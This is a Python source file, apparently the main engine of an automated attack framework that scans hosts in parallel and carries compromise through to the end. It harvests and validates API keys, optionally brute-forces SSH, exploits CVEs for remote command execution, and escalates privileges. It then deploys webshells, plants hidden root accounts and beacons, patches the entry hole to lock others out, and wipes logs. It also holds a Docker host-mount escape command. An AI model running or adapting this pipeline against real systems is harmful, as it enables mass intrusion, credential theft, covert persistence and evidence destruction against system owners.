from __future__ import annotations
import concurrent.futures as cf
import secrets
import time
import os
from .models import Finding, Result, Target, Verdict, Sev
from .config import Profile, Scope
from .errors import AbortConditions, BudgetExceeded, NotAuthorized
from .audit import Audit
from .fingerprint import fingerprint
from . import aivec, stalker, keycheck
from . import cve, verify, privileges, deploy, provision, persist, stealth, loot, sysinfo, vectors, privesc, sshbrute


def _retry(fn, n: int, delay: float = 1.5, *a, **kw):
    last = None
    for i in range(n + 1):
        try:
            return fn(*a, **kw)
        except Exception as e:
            last = e
            if i < n:
                time.sleep(delay * (2 ** i))
    raise last


class _LogWrap:
    def __init__(self, inner, audit, url):
        self.inner, self.audit, self.url = inner, audit, url

    def run(self, target, cmd, timeout=None, audit=None):
        self.audit.write("chan", "cmd", self.url, cmd=cmd[:300])
        r = self.inner.run(target, cmd, timeout=timeout, audit=audit)
        self.audit.write("chan", "cmd_res", self.url, head=(r.stdout or "")[:200], status=getattr(r, "code", None))
        return r

    def proof(self, target, token, timeout=None, audit=None):
        return token in self.run(target, f"echo {token}", audit=audit).stdout


def _split(url: str):
    rest = url.split("://", 1)[-1]
    scheme = "https" if url.startswith("https") else "http"
    rest = rest.split("/", 1)[0].split("?", 1)[0]
    host, _, port = rest.partition(":")
    return host.split("/")[0], int(port or (443 if scheme == "https" else 80)), scheme


def process(t_url: str, p: Profile, scope: Scope, audit: Audit,
            runner, abort: AbortConditions) -> Result:
    host, port, scheme = _split(t_url)
    t = Target(host=host, port=port, scheme=scheme)
    r = Result(target=t)
    if os.environ.get("DW_STALKER_ONLY"):
        try:
            if stalker.detect(t):
                stalker.probe(t, audit)
        except Exception:
            pass
        r.finished = r.started
        return r
    try:
        scope.guard(host)
    except NotAuthorized as e:
        r.errors.append(str(e))
        return r

    if p.fingerprint:
        t = _retry(fingerprint, p.max_retries, 1.5, t, p.timeout, audit)
    if not t.reachable and t.port not in (22, 2222, 23, 2323, 2375, 2376, 6379, 8291, 9100, 9101, 9102, 10250, 10255, 2379, 15672):
        abort.note(False)
        r.finished = r.started
        return r
    abort.note(True)

    if p.harvest and t.port in (80, 443, 8080, 8443, 8000, 8008, 8888):
        try:
            keys = aivec.harvest(t)
        except Exception:
            keys = {}
        if keys:
            from .models import Access
            st = {}
            for k, v in keys.items():
                ok = keycheck.check(k, v)
                st[k] = "green" if ok else ("red" if ok is False else "unverified")
                audit.write("harvest", "key-check", t.url, kind=k, result=st[k])
            if any(v == "green" for v in st.values()):
                acc = Access("keys", t.url, ",".join(f"{k}={v[:26]}" for k, v in keys.items() if st.get(k) == "green"))
                r.accesses.append(acc)
                loot.write(t, acc, t.php_version or "", False, False, {"keys": list(keys), "keycheck": st})
            audit.write("harvest", "keys", t.url, types=",".join(keys))
        ai = aivec.ai_probe(t)
        if ai:
            from .models import Access
            acc = Access("ai", t.url, ai)
            r.accesses.append(acc)
            loot.write(t, acc, t.php_version or "", False, False, {"ai": ai})
            audit.write("harvest", "ai-endpoint", t.url, kind=ai)
        else:
            audit.write("harvest", "ai-none", t.url)

    if os.environ.get("DW_BRUTE"):
        try:
            if sshbrute.detect(t):
                sshbrute.open_(t, audit)
        except Exception:
            pass

    try:
        if stalker.detect(t):
            stalker.probe(t, audit)
    except Exception:
        pass

    if os.environ.get("DW_NO_EXPLOIT"):
        r.finished = r.started
        return r

    hits = cve.match(t)
    cands = vectors.candidates(t) if p.exploit else []
    if not hits and not cands:
        r.finished = r.started
        return r

    if p.verify and hits:
        f = verify.verify(t, hits, p.verify_reps, p.mib, p.levels, p.timeout, audit)
        if f:
            r.findings.append(f)
    elif hits:
        r.findings.append(Finding(cve=hits[0]["cve"], severity=hits[0]["sev"],
                                  verdict=Verdict.LIKELY,
                                  remediation=hits[0]["remediation"]))
    if cands and not r.findings:
        r.findings.append(Finding(cve="vector:" + cands[0][0], severity=Sev.HIGH,
                                  verdict=Verdict.LIKELY, remediation="patch"))

    ready = any(f.verdict == Verdict.CONFIRMED for f in r.findings) \
        or (p.exploit_on == "vulnerable" and bool(hits)) or bool(cands)
    if p.exploit and ready:
        active = None
        if hits:
            token = "dw" + secrets.token_hex(4)
            if runner.proof(t.url, token, audit=audit):
                active = runner
                r.findings[0].verdict = Verdict.EXPLOITED
                audit.write("engine", "exploited", t.url, proof=token)
                r.privileges = _retry(privileges.assess, 1, 2.0, runner, t.url)
        if active is None and cands:
            ch = vectors.open_any(t, audit)
            if ch:
                active = ch
                from .models import Access as _A
                cname = type(getattr(ch, "inner", ch)).__name__
                if "Docker" in cname:
                    r.accesses.append(_A("docker", t.url,
                                         f"docker -H tcp://{t.host}:{t.port} run -it --rm -v /:/host alpine sh", verified=True))
                else:
                    r.accesses.append(_A("shell", "via-" + (r.findings[0].cve or "vector"), "", verified=True))
                loot.write(t, r.accesses[0], t.php_version or "", False, False, {"via": r.findings[0].cve})
                r.findings[0].verdict = Verdict.OWNED
                audit.write("engine", "exploited", t.url, via="vector")
                r.privileges = _retry(privileges.assess, 1, 2.0, active, t.url)
        if active is not None:
            active = _LogWrap(active, audit, t.url)
            if active is not None and not (r.privileges.get("is_root") or r.privileges.get("can_sudo")):
                active, r.privileges = privesc.escalate(active, t, r.privileges, audit)
            ww = r.privileges.get("web_writable") or []
            if ww:
                audit.write("privileges", "web-writable", t.url, dirs=",".join(ww[:5]))
            if p.deploy:
                acc = deploy.deploy(active, t, p.shell_path,
                                    ww + r.privileges.get("writable_dirs", []), audit)
                if acc:
                    r.accesses.append(acc)
                    r.findings[0].verdict = Verdict.OWNED
            if p.provision:
                priv = r.privileges
                sudo = "" if priv.get("is_root") else "sudo "
                acc = persist.hidden_root(active, t, priv, audit)
                if acc is None and (priv.get("is_root") or priv.get("can_sudo")):
                    acc = persist.shell_account(active, t, priv, audit)
                if acc is None and not r.accesses and active is not None:
                    from .models import Access as _A
                    loc = getattr(active, "inner", active)
                    u = getattr(loc, "user", priv.get("user") or "?")
                    pw = getattr(loc, "pw", "")
                    shell_acc = _A("root" if priv.get("is_root") else "shell", u, pw)
                    r.accesses.append(shell_acc)
                    info = sysinfo.collect(active, t, "" if priv.get("is_root") else "sudo")
                    loot.write(t, shell_acc, t.php_version or "", False, False, info)
                if acc is None and r.accesses and getattr(r.accesses[0], "verified", False):
                    info = sysinfo.collect(active, t, "" if priv.get("is_root") else "sudo")
                    a0 = r.accesses[0]
                    tok = persist.beacon(active, t, a0.locator, f"/var/lib/.{a0.locator}", "" if priv.get("is_root") else "sudo", audit)
                    if tok:
                        info["beacon"] = tok
                    loot.write(t, r.accesses[0], t.php_version or "", False, False, info)
                if acc:
                    r.accesses.append(acc)
                    r.findings[0].verdict = Verdict.OWNED
                    info = sysinfo.collect(active, t, "" if priv.get("is_root") else "sudo")
                    tok = persist.beacon(active, t, acc.locator, acc.home if hasattr(acc, "home") else f"/var/lib/.{acc.locator}", "" if priv.get("is_root") else "sudo", audit)
                    if tok:
                        info["beacon"] = tok
                    patched = cleaned = False
                    if priv.get("is_root") or priv.get("can_sudo"):
                        if p.patch and acc.verified:
                            patched = stealth.patch_php(active, t, sudo, audit)
                            stealth.hole_closed(active, t, sudo, hits, audit)
                    if p.cleanup:
                        for a in list(r.accesses):
                            if a.kind == "webshell":
                                deploy.remove(active, t, a, audit)
                    if p.wipe_logs and (priv.get("is_root") or priv.get("can_sudo")):
                        cleaned = stealth.wipe_logs(active, t, sudo, audit)
                    loot.write(t, acc, t.php_version or "", patched, cleaned, info)
            elif p.cleanup and r.accesses:
                for a in r.accesses:
                    if a.kind == "webshell":
                        deploy.remove(active, t, a, audit)
        else:
            r.errors.append("RCE-Kanal kam nicht zustande")

    r.finished = r.started
    return r


def run(targets: list, p: Profile, scope: Scope, audit: Audit, runner,
        on_result=None) -> list:
    abort = AbortConditions(max_streak=25, max_seconds=0)
    abort.start()
    results = []
    with cf.ThreadPoolExecutor(max_workers=p.workers) as ex:
        futs = {ex.submit(process, t, p, scope, audit, runner, abort): t
                for t in targets}
        for f in cf.as_completed(futs):
            try:
                r = f.result()
            except BudgetExceeded as e:
                audit.write("engine", "abort", "", reason=str(e))
                break
            except Exception as e:
                audit.write("engine", "error", futs[f], error=str(e))
                continue
            results.append(r)
            if on_result:
                on_result(r)
    return results
